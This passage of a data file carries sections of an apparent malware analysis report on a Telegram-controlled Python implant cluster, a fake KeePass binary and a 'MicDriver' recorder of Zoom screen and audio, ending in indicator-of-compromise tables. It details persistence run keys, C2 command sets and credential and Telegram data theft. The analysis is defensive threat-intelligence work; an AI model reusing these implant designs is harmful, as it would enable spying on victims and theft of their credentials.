up_tel    •   Exfiltrates Telegram Desktop and Windows Store variant of Telegram tdata\n                          directory to C2\n                      •   Writes a log file, log.txt\n    make_startup      •   Logic to add registry key,\n                          HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Default_SSH,\n                          and value, C:\\ProgramData\\ssh-cache-default\\{8bda3848-495e-43f4-8d10-\n                          7d37a67f1604}\\RuntimeSSH.exe\n                      •   Logic to add registry key,\n                          HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\winappx, and\n                          value, %ALLUSERSPROFILE%\\MicrosoftDistribution\\sysmain\\winappx.exe"
+ },
+ {
+  "id": "p128",
+  "text": "smqdservice.exe\n             File   PE32+ executable (GUI) x86-64, for MS Windows\n           MD5      7E23FFADB664B0E53D821478A249D84C\n          SHA1      0FE3CF4CABADEDB382B0833DCB6BA74DB3242022\n        SHA256      4A3B003994112B4DD24AC8B9CC4757F4A12576B57B3CC8F5028D85FBCEB7C405\n       Compiler     Microsoft Visual C/C++(2022 v.17.4)[-]\n          Linker    Microsoft Linker(14.34**)[GUI64]\n         Packer     PyInstaller(-)[-]"
+ },
+ {
+  "id": "p129",
+  "text": "Behavioral Analysis\nMalware sample, smqdservice.exe, was observed after executing Pictory_premium_ver9.0.4.exe\nin an initially compressed state along with Python dependencies within File26.zip. Upon\nuncompressing into directory, C:\\ProgramData\\SMQDServicePackages\\488ht1-8ww648q\\ and\nexecuting the sample, periodic POST requests were made to https://api.telegram.org/."
+ },
+ {
+  "id": "p130",
+  "text": "Static Analysis\nThe decompiled malware sample smqdservice.exe was like the decompiled malware sample\nRuntimeSHH.exe."
+ },
+ {
+  "id": "p131",
+  "text": "Upon decompiling smqdservice.exe, the Python 3.11 file, main.py, resulted. Python file, main.py,\ncontained the following added import compared to RuntimeSSH.exe."
+ },
+ {
+  "id": "p132",
+  "text": "•   threading"
+ },
+ {
+  "id": "p133",
+  "text": "Python file, main.py, contains logic to perform the following differently from RuntimeSSH.exe:\nCreate mutex, nih6723443489kcvrf\nRun a dedicated thread to call send_health_msg()"
+ },
+ {
+  "id": "p134",
+  "text": "Python file, main.py, contained the following additional functions when compared to\nRuntimeSSH.exe.\n           Function     Description\n    send_health_msg        • Calls send_message_arbitrary() from bot\\utils.py within formatted message\n                               that includes the hostname of the machine\n                           • Waits 86400 seconds (1 day) to send the next message\n                           • Calls the sleep() function for 10 seconds if any of the above actions raised\n                               an exception\n run_builtin_command       • Like RuntimeSSH.exe version of the same function\n                           • Includes running command: wmic startup get caption"
+ },
+ {
+  "id": "p135",
+  "text": "Malware sample, smqdservice.exe, relied on two modules, bot and system, both containing\nPython files.\nPython file, bot\\strings.py, contained the following variation."
+ },
+ {
+  "id": "p136",
+  "text": "msg_health = '       Health message: `{pc_name}` is active'\nPython file, bot\\utils.py, contained no variation from RuntimeSSH.exe bot\\utils.py.\nPython file, system\\config.py, contained configuration global variables to include the executable\npath of C:\\ProgramData\\SMQDServicePackages\\488ht1-8ww648q, registry name of\nSMQDService, executable name of smqdservice.exe, configuration path of\n%APPDATA%\\SMQDService and Telegram configuration values.\nPython file, system\\contants.py, contained no variation from RuntimeSSH.exe\nsystem\\contants.py.\nPython file, system\\mycrypto.py, contained no variation from winappx.exe mycrypto.py.\nPython file, system\\utils.py, contained no variation from RuntimeSSH.exe system\\utils.py.\nPython file, system\\winstructures.py, contained no variation from RuntimeSSH.exe\nsystem\\winstructures.py.\nFile, rantom.txt, contained the following two variations from RuntimeSSH.exe rantom.txt.\n    Function   Description\n      up_tel      • Exfiltrates Telegram Desktop and Windows Store variant of Telegram tdata\n                      directory to C2\n make_startu      • Logic to add registry key,\n           p          HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SMQDService, and"
+ },
+ {
+  "id": "p137",
+  "text": "value, C:\\ProgramData\\SMQDServicePackages\\488ht1-\n                       8ww648q\\smqdservice.exe\n                   •   Logic to add registry key,\n                       HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\winappx, and value,\n                       %ALLUSERSPROFILE%\\MicrosoftDistribution\\sysmain\\winappx.exe"
+ },
+ {
+  "id": "p138",
+  "text": "KeePass.exe\n       File   PE32+ executable (GUI) x86-64, for MS Windows\n     MD5      7402F2F9263782A4C469570035843510\n    SHA1      309C97A2D8E8212B9C51CD485CE5B3C7A1BB6BA5\n  SHA256      C2DD678511373DC07E73EF1A580FC3332E640F15FF0D4C1044D4B9F305B6F503\n Compiler     Microsoft Visual C/C++(2022+)[-]\n    Linker    Microsoft Linker(14.42**)[GUI64,signed]\n   Packer     PyInstaller(-)[-]"
+ },
+ {
+  "id": "p139",
+  "text": "Behavioral Analysis"
+ },
+ {
+  "id": "p140",
+  "text": "Malware sample, KeePass.exe, masqueraded as the open-source password manager, KeePass.\nMalware sample, KeePass.exe, was contained within directory, KP_Log\\. KP_Log\\ contained\nPython modules and executables. From KP_log\\XSL\\KDBX_Common\\, there were .pyd and .dll\nfiles along with a zip file, base_library.zip, and a text file, rantom.txt (MD5:\n2965817D063F1E8F9889F9126443D631)."
+ },
+ {
+  "id": "p141",
+  "text": "Upon uncompressing KP_log\\XSL\\KDBX_Common\\base_library.zip into\nKP_log\\XSL\\KDBX_Common\\, then executing KeePass.exe, data was written to KP_log\\b_logs.log\nand KP_log\\logs.log. Each log file displayed debugging information including periodic POST\nrequests to https://api.telegram.org/."
+ },
+ {
+  "id": "p142",
+  "text": "Static Analysis"
+ },
+ {
+  "id": "p143",
+  "text": "Malware sample, KeePass.exe, was unique for three primary reasons."
+ },
+ {
+  "id": "p144",
+  "text": "•   It wrote log files relative to itself in plaintext about its requests to api.telegram.org"
+ },
+ {
+  "id": "p145",
+  "text": "•   While it can be viewed as a masquerading software, it functioned more like the persistent\n       implants.\n   •   It was configured with other API endpoints:\n           o WhatsApp (https://api.whatsapp.com/send)\n           o Facebook (https://graph.facebook.com/v12.0/me/messages)\n           o An endpoint (https://signal.example.com/api/v1/send)\n           o Viber (https://chatapi.viber.com/pa/send_message)"
+ },
+ {
+  "id": "p146",
+  "text": "Upon decompiling malware sample, KeePass.exe, its header indicated a Python 3.13 script made\ninto an executable using PyInstaller. Decompiled Python 3.13 script, main.py, contained the\nfollowing logic."
+ },
+ {
+  "id": "p147",
+  "text": "•   Import the following libraries\n          o hashlib\n          o logging\n          o asyncio\n          o time\n          o sys\n          o io\n          o re\n          o _winapi\n          o system (custom)\n          o requests\n          o telegram\n          o bot (custom)\n          o threading\n          o logger\n   •   Create a mutex, noi672pp434awkc12f"
+ },
+ {
+  "id": "p148",
+  "text": "Python script, main.py, contained the following functional blocks.\n         Block Label   Block Description\n        send_request       • Sends a request\n                           • Returns JSON format of the response\n                           • Raises an exception if response was invalid"
+ },
+ {
+  "id": "p149",
+  "text": "ALL_REQS       •   Tests connection to multiple API endpoints using send_request()\n            Initialize   •   Calls create_config_file()\n   Configuration File    •   Gets token, xml_elmt, from configuration file\n                         •   Gets user_id using the previous token\n                         •   Gets hostname\n                         •   Logs that it read the config file\n       check_for_file    •   Check if C:\\ProgramData\\up.txt exists\nsend_initial_message     •   Logs actions\n                         •   Calls check_for_file()\n   send_health_msg       •   Logs health message about the bot\n        downloader       •   Gets file name\n                         •   Tests for a combination of file name beginning strings: dev, bit, and kee, and\n                             tests for file name ending of .dll\n                         •   Tests if file name begins with reg and ends with .zip\n                         •   Tests if file name ends with .zip\n                         •   Tests if file name includes keepass.exe\n                         •   Tests if file name ends with .exe\n                         •   For each of the above tests for file name sub-strings, a sub-logic is run\n  analyze_command        •   Checks if message text started with @@, ##, or ** C2 commands\n                         •   Runs sub-logic based on how the message started\nrun_builtin_command      •   Checks if message text is one of multiple C2 commands\n                                 o pl (gets process list)\n                                 o si (gets system info)\n                                 o ss (gets screenshot)\n                                 o dt (get installed Telegram data)\n                                 o regtro (runs: wmic startup get caption)\n                                 o cht (starts with)\n                                 o runtro\n                                 o whois (sends GET request to https://api.ipify.org)\n                                 o runexe<< (starts with)\n                                 o AppPath\n                                 o ConfigPath\n                                 o DownloadFile\n                                 o Exit (starts with)\n                                 o Size (starts with)\n                                 o CheckProcess (starts with)\n                                 o MakeDir (starts with)\n                                 o Unzip (starts with)\n                                 o Hidden (starts with)\n                                 o Zip (starts with)\n                                 o GetFolder (starts with)\n                                 o Dir (starts with)\n                                 o Copy (starts with)"
+ },
+ {
+  "id": "p150",
+  "text": "o Delete (starts with)\n                                       o Rename (starts with)\n                               •   Runs sub-logic based on the command received\n Initialize Telegram Bot       •   Sets up and starts bot\n              Application\n      Name-Main Idiom          •   Checks arguments\n                               •   Gets SHA1 hash of string\n                               •   Start Application"
+ },
+ {
+  "id": "p151",
+  "text": "Most of the reference C2 commands and function blocks were detailed further in the winappx.exe\nand RuntimeSSH.exe sections. The imported system and bot custom modules were functionally\nlike the logic detailed in the RuntimeSSH.exe section."
+ },
+ {
+  "id": "p152",
+  "text": "MicDriver\nMicDriver.exe\n      File    PE32+ executable (GUI) x86-64, for MS Windows\n     MD5      D70EBF20E3D697897BAD5BEBF72EA271\n    SHA1      F7FFF73894F80658CD3C2647DFFC6A7E3CDCF22D\n  SHA256      5D6AD895C126191FA202C412B08FE0DD8B75A72928B1E5E34986A040938384C6\n Compiler     Microsoft Visual C/C++(2022+)[-]\n   Linker     Microsoft Linker(14.37**)[GUI64]"
+ },
+ {
+  "id": "p153",
+  "text": "MicDriver.dll\n     File    PE32+ executable (GUI) x86-64 Mono/.Net assembly, for MS Windows\n    MD5      F8B5554808428291ACC65D1FD2EFE01C\n   SHA1      548A66011314163254520FDE266A5E1FFC3F6EFC\n SHA256      168A487F0E44FFEE975ECD27D3F4000C750E711963A61D6CE244FA390DD17441\n  Library    .NET(v4.0.30319)[-]\n   Linker    Microsoft Linker(48.0)[GUI64]"
+ },
+ {
+  "id": "p154",
+  "text": "MicDriver.zip\n    File     Zip archive data, at least v2.0 to extract\n    MD5      8C00489632CCEFDAC3612329FE5B5491"
+ },
+ {
+  "id": "p155",
+  "text": "SHA1   0333B608A98F24A9B8C232FAC782BC9EABA74829\n SHA256   FFEAE7C9ED3EDABF3646376F50B738B4FBCA442154CBFB6252B3AA5845F3D793"
+ },
+ {
+  "id": "p156",
+  "text": "Malware sample, MicDriver.exe, leveraged MicDriver.dll to function. Both MicDriver.exe and\nMicDriver.dll were compressed within MicDriver.zip along with other dependencies. MicDriver.dll\ncontained logic to record screen and audio, cache captures, perform file compression with a\npassword, perform file deletion, and stage compressed files to be sent to a C2. The following were\nthe namespaces within MicDriver.dll."
+ },
+ {
+  "id": "p157",
+  "text": "•   -\n   •   Microsoft.CodeAnalysis\n   •   System.Runtime.CompilerServices\n   •   ZoomRecorder\n   •   ZoomRecorder.Properties"
+ },
+ {
+  "id": "p158",
+  "text": "Namespace -\nNamespace, -, contained logic for Module and Program classes. The Program class contained the\nMain() logic to check if C:\\ProgramData\\Drivers\\MicDriver\\Cache\\ existed, move each file into\nC:\\ProgramData\\ZlibDate\\Z84A847FEEB1FC2s\\Records\\. When navigating to\nC:\\ProgramData\\ZlibDate\\Z84A847FEEB1FC2s\\Records\\ on a victim machine, there were two\ncompressed files named ZP_20250701070035810028043324.part1.rar and\nZP_20250701070035810028043324.part2.rar. The Program class contained logic to execute the\nmoving of files periodically via a thread.\nResulting media files saved by logic within the Program class logic used the following file naming\nformats for Bitmap of screen content.\n       C:\\ProgramData\\Drivers\\MicDriver\\_*.jpeg"
+ },
+ {
+  "id": "p159",
+  "text": "Namespace ZoomRecorder\nNamespace, ZoomRecorder, contained a Config class which held the following variables that\naccounted for screen recording sessions, quality, frequency, and location for program, storage,\nand cache.\n       public const string destinationPath =\n       \"C:\\\\ProgramData\\\\ZlibDate\\\\Z84A847FEEB1FC2s\\\\Records\";"
+ },
+ {
+  "id": "p160",
+  "text": "public const string programPath = \"C:\\\\ProgramData\\\\Drivers\\\\MicDriver\";\n       public const string cacheDirPath = \"C:\\\\ProgramData\\\\Drivers\\\\MicDriver\\\\Cache\";\n       public const int quality = 100;\n       public const int frameRate = 15;\n       public const int ffmpegCpuLimit = 48;\n       public const int takeSsInterval = 10000;\n       public const long zoomCheckInterval = 5000L;\n       public const long zoomSplitInterval = 600000L;"
+ },
+ {
+  "id": "p161",
+  "text": "The IntervalTimer class contained logic to start and stop a timer object."
+ },
+ {
+  "id": "p162",
+  "text": "The OnPeakVolumeChangedArgs class contained logic to capture events related to volume."
+ },
+ {
+  "id": "p163",
+  "text": "The Recorder class contained logic to record screen, audio, and write data. Resulting media files\nsaved by logic within the Recorder class used the following file naming formats for input and\noutput audio source data respectively.\n       C:\\ProgramData\\Drivers\\MicDriver\\_*_mic.wav\n       C:\\ProgramData\\Drivers\\MicDriver\\_*_spk.wav"
+ },
+ {
+  "id": "p164",
+  "text": "The Utils class contained logic to import dependent DLLs and compress data files; the following\ncommand was used to password protect the compressed files.\n       Rar.exe a -r -inul -pLoLoLoLo -ep -v chunkSize \"{0}\" \"{1}\" targetArchiveName\n       \"C:\\\\ProgramData\\\\Drivers\\\\MicDriver\\\\_sourceFileName\"\nThe logic continued to move the compressed files from\nC:\\ProgramData\\Drivers\\MicDriver\\Cache\\ to\nC:\\ProgramData\\ZlibDate\\Z84A847FEEB1FC2s\\Records\\ then deleted the uncompressed files."
+ },
+ {
+  "id": "p165",
+  "text": "The Utils class contained logic to rename audio files with various suffixes (_spk.wav, spk.mp3,\n_mic.wav, and _mic.mp3). The Utils class contained logic to capture Desktop/screen boundaries.\nWhen password \"LoLoLoLo\" was used to decrypt and uncompress the compressed files in\nC:\\ProgramData\\ZlibDate\\Z84A847FEEB1FC2s\\Records\\, image files of victim on Zoom calls\nalong with audio files existed.\nResulting media files saved by logic within the Utils class used the following file naming formats\nfor cached files.\n       C:\\ProgramData\\Drivers\\MicDriver\\Cache\\ZP_*"
+ },
+ {
+  "id": "p166",
+  "text": "Namespace ZoomRecorder.Properties\nNamespace, ZoomRecorder.Properties, contained the Resources class. The Resources class\ncontained logic to reference an assembly named \"Rar\" and writing assembly to memory silently.\nThe resources section of MicDriver.dll contained an XML file that referenced MDll.dll, Rar.exe, and\nsilent.wav in the mentioned Resources directory."
+ },
+ {
+  "id": "p167",
+  "text": "Resource: MDll.dll\n     File   PE32+ executable (DLL) (GUI) x86-64, for MS Windows\n     MD5    88022704FFB1264A6587E6E1B0759600\n    SHA1    97BB11D34158587BA2A54348E9180279752B4FCC\n  SHA256    16162647CE3CC5B9043BF114F94E626E84188DA10FBF4882960A7EDE8EDE0868\n Compiler   Microsoft Visual C++(2022+)[-]\n   Linker   Microsoft Linker(14.35**)[DLL64]"
+ },
+ {
+  "id": "p168",
+  "text": "Malware sample, MicDriver.dll, called export function, getMState4(), within malware sample,\nMDll.dll. Function, getMState4(), called function, CoInitializeInstance(), which initialized a COM\nobject. Function, getMState4(), called function, getMState(), which may return the following\nstrings indicating a status.\n       Session state: Active\\r\\n\n       Session state: Expired\\r\\n\n       Session state: Inactive\\r\\n"
+ },
+ {
+  "id": "p169",
+  "text": "The above strings reflect the WASAPI session state of an audio device. Function, getMState(),\ncalled function, CoCreateInstance(), which interfaces with the IMMDeviceEnumerator interface.\nPer Microsoft, interface, IMMDeviceEnumerator, can enumerate audio endpoint device\nresources."
+ },
+ {
+  "id": "p170",
+  "text": "Resource: Rar.exe\n     File    PE32+ executable (console) x86-64, for MS Windows\n     MD5     282F2ABE0429B978C55F972171DFBC17\n    SHA1     02F8C0841D3FB9A4D13C8D0B8266B23949C0B8F1\n  SHA256     7A06B0227AD51454A72EA6E34347ECC8A61D4FB9C9FD15040A97F1DDEBC4BE81\n Compiler    Microsoft Visual C/C++(2022 v.17.0)[-]\n   Linker    Microsoft Linker(14.30, Visual Studio 2022 17.0*)[Console64,console,signed]"
+ },
+ {
+  "id": "p171",
+  "text": "This is the official command line RAR application by GmbH, WinRAR. This binary was used for\ncompression processes."
+ },
+ {
+  "id": "p172",
+  "text": "Resource: silent.wav\n    File    RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 48000 Hz\n    MD5     262BA25122F63CBB1BCE6D182C46D6CB\n   SHA1     D9E68886F9311F64DB27EFAD50A865FACC5C1A42\n SHA256     D8C5534913EC16017A91401FFA5826B641A7E0CE4E46F6EC9D0F927669A47B11"
+ },
+ {
+  "id": "p173",
+  "text": "This is a one-minute-long silent audio file. Malware sample, MicDriver.dll, used audio file,\nsilent.wav, while capturing audio."
+ },
+ {
+  "id": "p174",
+  "text": "External Resource: createdump.exe\n     File    PE32+ executable (console) x86-64, for MS Windows\n     MD5     A1F883223B8C98F53AD04CFD007981D1\n    SHA1     F04DCA75D3D58EBC985E423590DA4865E475D7AB\n  SHA256     0C1C835D26E4D2710598DA3ADE5EA6B5C51E850C64D2964E053468E509BBD23D\n Compiler    Microsoft Visual C/C++(2022+)[-]\n   Linker    Microsoft Linker(14.37**)[Console64,console,signed]"
+ },
+ {
+  "id": "p175",
+  "text": "This binary provides minidump capability and was distributed by Microsoft."
+ },
+ {
+  "id": "p176",
+  "text": "Indicators\nwinappx.exe\n                   Indicator                                           Type        Relevance\n                           481c5b5e69a08c3df206c59fd8ddc0dc          MD5 Hash     winappx.exe\n                                                                                  MD5 hash\n                                         euyrsmnszb85sf4444s         Mutex        winappx.exe\n                                                                                  mutex\n                 %ALLUSERSPROFILE%\\ZlibDate\\Settings\\lfgy.Dat        File Path    winappx.exe\n                                                                                  system files\n                                                                                  pending exfil\n                                                                                  catalog\n                C:\\ProgramData\\Drivers\\Whatsapp\\WhatssApp.exe        File Path    winappx.exe\n                                                                                  downloaded\n                                                                                  threat actor\n                                                                                  binary\n              %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s            File Path    winappx.exe\n                                                                                  sample log\n                                                                                  directory\n                                                        cmd.Dat      Temporary    winappx.exe\n                                                                     File         command\n                                                                                  result file\n                                             https://api.ipify.org   URL          winappx.exe\n                                                                                  IP lookup API\n                                                                                  URL\n                                                       wmic.Dat      Temporary    winappx.exe\n                                                                     File         AutoStart\n                                                                                  entries\n                                                                                  catalog file\n                                  https://ams1.vultrobjects.com      S3 API URL   winappx.exe\n                                                                                  S3 API\n                                                                                  Interaction\n                                                                                  URL\n                                      -ppmppnf12uyt4r5tifjdfh-       S3 API       winappx.exe\n                                                                     Bucket       S3 API\n                                                                     Name         Interaction\n                                                                     Substring    Bucket\n                                                                                  Name\n                                                                                  Substring\n                    %ALLUSERSPROFILE%\\ZlibDate\\CachedFiles           Folder       winappx.exe\n                                                                                  sample"
+ },
+ {
+  "id": "p177",
+  "text": "download\n                                                                         directory\n       %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\Files     Folder      winappx.exe\n                                                                         logs pending\n                                                                         exfiltration\n                                                                         directory\n              %ALLUSERSPROFILE%\\ZlibDate\\Settings\\hhas.Dat   File Path   winappx.exe\n                                                                         exfiltrated\n                                                                         file hashes\n                                                                         catalog\n    %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\SN_*.Dat     File Path   winappx.exe\n                                                             Mask        screenshot\n                                                                         files\n     %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\LF*.Dat     File Path   winappx.exe\n                                                             Mask        system file\n                                                                         catalog\n%ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\0TelStore*.Dat   File Path   winappx.exe\n                                                             Mask        Telegram\n                                                                         exfiltration\n                                                                         data\n     %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\PL*.Dat     File Path   winappx.exe\n                                                             Mask        process\n                                                                         listing\n                                                                         catalog\n      %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\Si*.Dat    File Path   winappx.exe\n                                                             Mask        system\n                                                                         information\n                                                                         catalog\n                               %LOCALAPPDATA%\\TelPath.txt    File Path   winappx.exe\n                                                                         Telegram\n                                                                         installation\n                                                                         path storage\n                                                                         location\n    %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\0Tel*.Dat    File Path   winappx.exe\n                                                             Mask        Telegram\n                                                                         exfiltration\n                                                                         data\n      %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\IP*.Dat    File Path   winappx.exe\n                                                             Mask        installed\n                                                                         programs\n                                                                         catalog\n   %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\1Chr*.Dat     File Path   winappx.exe\n                                                             Mask        default\n                                                                         Google\n                                                                         Chrome\n                                                                         profile"
+ },
+ {
+  "id": "p178",
+  "text": "exfiltration\n                                                                                             data\n                  %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\1Edg*.Dat          File Path   winappx.exe\n                                                                                 Mask        default Edge\n                                                                                             profile\n                                                                                             exfiltration\n                                                                                             data\n                  %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\1Moz*.Dat          File Path   winappx.exe\n                                                                                 Mask        Mozilla\n                                                                                             profile\n                                                                                             exfiltration\n                                                                                             data\n                            %ALLUSERSPROFILE%\\ZlibDate\\Settings\\config.xml       File Path   winappx.exe\n                                                                                             configuration\n                                                                                             file\n                    %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\rsc.Dat          File Path   winappx.exe\n                                                                                             threat actor\n                                                                                             custom\n                                                                                             Python script\n                                                                                             storage\n                                                                                             location\n                     %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\Z-*.Dat         File Path   winappx.exe\n                                                                                 Mask        browser\n                                                                                             cache\n                                                                                             Telegram and\n                                                                                             WhatsApp\n                                                                                             exfiltration\n                                                                                             data\n   C:\\ProgramData\\Drivers\\Whatsapp\\User Data\\EBWebView\\Default\\Local Storage     File Path   winappx.exe\n                                                                                             sample\n                                                                                             storage\n                                                                                             location\n                                       C:\\ProgramData\\Drivers\\Whatsapp\\User      File Path   winappx.exe\nData\\EBWebView\\Default\\IndexedDB\\https_web.whatsapp.com_0.indexeddb.leveldb                  sample\n                                                                                             storage\n                                                                                             location\n                      %ALLUSERSPROFILE%\\ZlibDate\\CachedFiles\\MicDriver.zip       File Path   “MicDriver”\n                                                                                             download\n                                                                                             location\n                                             C:\\ProgramData\\Drivers\\MicDriver    Folder      “MicDriver”\n                                                                                             install\n                                                                                             directory\n                                C:\\ProgramData\\Drivers\\MicDriver\\MicDriver.exe   File Path   “MicDriver”\n                                                                                             threat actor\n                                                                                             binary\n             HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MicDriver        Registry    “MicDriver”\n                                                                                 Key         registry run"
+ },
+ {
+  "id": "p179",
+  "text": "key (HKCU\n                                                                                          hive)\n                                                              MicDriver.exe   Process     winappx.exe\n                                                                              Name        started\n                                                                                          process\n                                                            WhatssApp.exe     Process     winappx.exe\n                                                                              Name        started\n                                                                                          process\n                                          C:\\ProgramData\\Drivers\\Whatsapp     Folder      “WhatssApp”\n                                                                                          install\n                                                                                          directory\n                        C:\\ProgramData\\Drivers\\Whatsapp\\WebView2Loader.dll    File Path   “WhatssApp”\n                                                                                          threat actor\n                                                                                          binary\n                            C:\\ProgramData\\Drivers\\Whatsapp\\WhatssApp.exe     File Path   “WhatssApp”\n                                                                                          threat actor\n                                                                                          binary\n                          %ALLUSERSPROFILES%\\ZlibDate\\CachedFiles\\mails       Folder      Outlook mail\n                                                                                          exfiltration\n                                                                                          directory\n%ALLUSERSPROFILES%\\ZlibDate\\Settings\\b3f8c29e-d670-43d8-846f-29d5a5f2c3f8     File Path   Outlook mail\n                                                                                          exfiltrated\n                                                                                          message\n                                                                                          catalog\n                   %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\OU*.zip        File Path   Outlook mail\n                                                                                          message\n                                                                                          exfiltration\n                                                                                          data\n              %ALLUSERSPROFILES%\\ZlibDate\\CachedFiles\\mails\\*content.json     File Path   Outlook mail\n                                                                              Mask        message\n                                                                                          exfiltration\n                                                                                          data\n                %ALLUSERSPROFILES%\\ZlibDate\\CachedFiles\\mails\\*body.html      File Path   Outlook mail\n                                                                              Mask        message\n                                                                                          exfiltration\n                                                                                          data\n                                               ChromePasswordsBackup.db       File        Google\n                                                                                          Chrome\n                                                                                          credentials\n                                                                                          Default User\n                                                                                          Profile\n                                                                                          database\n                                                                                          sample copy\n                                                    chrome_passwords.json     File        Chrome\n                                                                                          credentials\n                                                                                          dump file"
+ },
+ {
+  "id": "p180",
+  "text": "%ALLUSERSPROFILE%\\ZlibDate\\Settings\\241cb83f-4a8e-4112-a56e-2f8655ee019c              File Path    WPD object\n                                                                                                    exfiltration\n                                                                                                    catalog\n               %ALLUSERSPROFILE%\\ZlibDate\\Z84A847FEEB1FC2s\\Files\\Phones\\*              File Path    WPD object\n                                                                                       Mask         exfiltration\n                                                                                                    data"
+ },
+ {
+  "id": "p181",
+  "text": "MsCache.exe\n                                 Indicator                                      Type         Relevance\n                                      3e7a2fcef1d038d05b20148c573a6499         MD5        MSCache.exe\n                                                                               Hash       MD5 hash\n                                      C:\\ProgramData\\ZlibDate\\CachedFiles\\     Folder     MSCache.exe\n                                                                                          sample\n                                                                                          storage folder\n                     %LOCALAPPDATA%\\Google\\Chrome\\Settings\\User Data           Folder     MSCache.exe\n                                                                                          sample\n                                                                                          storage folder\n                        %LOCALAPPDATA%\\Google\\Chrome\\User Data ==>             File       MSCache.exe\n                     %LOCALAPPDATA%\\Google\\Chrome\\Settings\\User Data           I/O        folder copy I/O\n                                                                                          operation\n   Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like   User-      MSCache.exe\n                                     Gecko) Chrome/123.0.0.0 Safari/537.36     Agent      static User-\n                                                                                          Agent\n                      C:\\ProgramData\\ZlibDate\\CachedFiles\\credentials.json     File       MSCache.exe\n                                                                               Path       credential file\n                               C:\\ProgramData\\ZlibDate\\CachedFiles\\*.pickle    File       MSCache.exe\n                                                                               Path       token dump\n                                                                               Mask       files\n                                 C:\\ProgramData\\ZlibDate\\CachedFiles\\er.txt    File       MSCache.exe\n                                                                               Path       error log"
+ },
+ {
+  "id": "p182",
+  "text": "RuntimeSSH.exe and smqdservice.exe\n                             Indicator                                  Type                Relevance\n                               1e6b601f733bc40eaa58916986bfc5b9        MD5            Pictory_premium_ve\n                                                                       Hash           r9.0.4.exe MD5 hash\n                                                                                      (smqdservice.exe\n                                                                                      first stage sample)\n                               7e23ffadb664b0e53d821478a249d84c        MD5            smqdservice.exe\n                                                                       Hash           MD5 hash\n                                                 nih6723443489kcvrf    Mutex          smqdservice.exe\n                                                                                      mutex\n                      C:\\ProgramData\\SMQDServicePackages\\488ht1-       File Path      smqdservice.exe\n                                        8ww648q\\smqdservice.exe                       execution path"
+ },
+ {
+  "id": "p183",
+  "text": "%APPDATA%\\SMQDService         Folder      smqdservice.exe\n                                                                                configuration\n                                                                                directory\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SMQDServi        Registry    smqdservice.exe\n                                                          ce        Key         HKCU hive run key\n  HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\winappx        Registry    Sample cluster\n                                                                    Key         HKCU hive run key\n   %ALLUSERSPROFILE%\\MicrosoftDistribution\\sysmain\\winappx.exe      File Path   Sample cluster run\n                                                                                key execution path\n                           ebdd9595b79b39f53909d862499dbc94         MD5         RuntimeSSH.exe\n                                                                    Hash        MD5 hash\n                                                        ytyjyujyu   Mutex       RuntimeSSH.exe\n                                                                                mutex\n                                           C:\\ProgramData\\ur.txt    File        Sample cluster ‘**’\n                                                                                command message\n                                                                                destination file\n     C:\\ProgramData\\ssh-cache-default\\{8bda3848-495e-43f4-8d10-     Folder      RuntimeSSH.exe\n                                                  7d37a67f1604}                 sample directory\n                                           C:\\ProgramData\\up.txt    File        Sample cluster\n                                                                                check_for_file\n                                                                                function C2\n                                                                                message buffer file\n                                  %APPDATA%\\Config\\config.xml       File        RuntimeSSH.exe\n                                                                                configuration file\n     C:\\ProgramData\\ssh-cache-default\\{8bda3848-495e-43f4-8d10-     File Path   RuntimeSSH.exe\n                                 7d37a67f1604}\\RuntimeSSH.exe                   run key execution\n                                                                                path\n                                                      rantom.txt    File        Sample cluster\n                                                                                encrypted\n                                                                                command\n                                                                                implementation file\n                                             %APPDATA%\\Config       Folder      RuntimeSSH.exe\n                                                                                configuration\n                                                                                directory\n                                                  “C:\\Windows “     Folder      Sample cluster\n                                                                                place_dll encrypted\n                                                                                command directory\n                                      “C:\\Windows \\SysWOW64”        Folder      Sample cluster\n                                                                                place_dll encrypted\n                                                                                command directory\n                         “C:\\Windows \\SysWOW64\\bthudtask.exe”       File Path   Sample cluster\n                                                                                place_dll encrypted\n                                                                                command\n                                                                                download\n                                                                                destination path"
+ },
+ {
+  "id": "p184",
+  "text": "“C:\\Windows \\SysWOW64\\bthudtask.exe”         Process    Sample cluster\n                                                                         Image      place_dll encrypted\n                                                                         Path       command process\n                                                                                    image path\n                                                        bthudtask.exe    Fileless   Sample cluster\n                                                                         Process    place_dll encrypted\n                                                                         Image      command process\n                                                                                    name (no backing\n                                                                                    file)\n HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Default_SS           Registry   RuntimeSSH.exe\n                                                             H           Key        HKCU hive run key"
+ },
+ {
+  "id": "p185",
